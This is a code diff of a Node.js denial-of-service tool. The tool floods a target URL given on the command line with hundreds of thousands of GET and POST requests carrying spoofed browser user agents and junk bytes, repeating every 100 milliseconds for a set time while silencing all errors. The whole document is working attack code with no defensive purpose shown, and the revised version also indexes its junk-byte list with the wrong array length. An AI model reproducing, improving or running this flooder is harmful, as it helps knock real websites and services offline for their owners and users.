@@ -9,11 +9,12 @@ if (process.argv.length <= 2) {
 
 const target = process.argv[2];
 const parsed = url.parse(target);
-const host = parsed.host;
+const host = url.parse(target).host;
 const time = process.argv[3];
+const numRequests = 500000; // Number of concurrent requests
 
-process.on('uncaughtException', function (e) {});
-process.on('unhandledRejection', function (e) {});
+process.on('uncaughtException', function (e) { });
+process.on('unhandledRejection', function (e) { });
 
 const userAgents = [
 "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36",
@@ -6199,38 +6200,43 @@ const userAgents = [
 "LG-A290/V100 Obigo/Q05A MMS/LG-MMS-V1.0/1.2 Java/ASVM/1.1 Profile/MIDP-2.1 Configuration/CLDC-1.1"
 ];
 
+const nullHexs = [
+"\x00", 
+"\xFF", 
+"\xC2", 
+"\xA0"
+];
 
-async function makeRequest(requestType, userAgent) {
-    return new Promise((resolve) => {
-        const s = net.createConnection(80, host);
+const makeRequest = async () => {
+    const s = require('net').Socket();
+    s.connect(80, host);
+    s.setTimeout(10000);
 
-        s.on('connect', () => {
-            s.setTimeout(10000);
-            s.write(`${requestType} ${target} HTTP/1.1\r\nHost: ${parsed.host}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ${userAgent}\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n`);
-        });
+    const randomUserAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
 
-        s.on('data', () => {
-            setTimeout(() => {
-                s.destroy();
-                resolve();
-            }, 5000);
-        });
-    });
-}
+    for (let i = 0; i < numRequests; i++) {
+        const requestType = Math.random() < 0.5 ? 'GET' : 'POST';
+        const requestData = (requestType === 'POST') ? nullHexs[Math.floor(Math.random() * userAgents.length)] : '';
 
-async function runRequests() {
-    const requests = [];
+        const request = `${requestType} ${target} HTTP/1.1\r\nHost: ${parsed.host}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ${randomUserAgent}\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n${requestData}`;
 
-    for (let i = 0; i < 50; i++) {
-        const requestType = i % 3 === 0 ? 'GET' : (i % 3 === 1 ? 'HEAD' : 'POST');
-        const userAgent = requestType === 'POST' ? nullHexs[Math.floor(Math.random() * nullHexs.length)] : userAgents[Math.floor(Math.random() * userAgents.length)];
-
-        requests.push(makeRequest(requestType, userAgent));
+        s.write(request);
     }
 
+    s.on('data', function () {
+        setTimeout(function () {
+            s.destroy();
+        }, 5000);
+    });
+};
+
+const runRequests = async () => {
+    const requests = Array.from({ length: numRequests }, () => makeRequest());
     await Promise.all(requests);
-}
+};
 
-const int = setInterval(runRequests, 0);
+const intervalId = setInterval(runRequests, 100);
 
-setTimeout(() => clearInterval(int), time * 1000);
+setTimeout(() => {
+    clearInterval(intervalId);
+}, time * 1000);
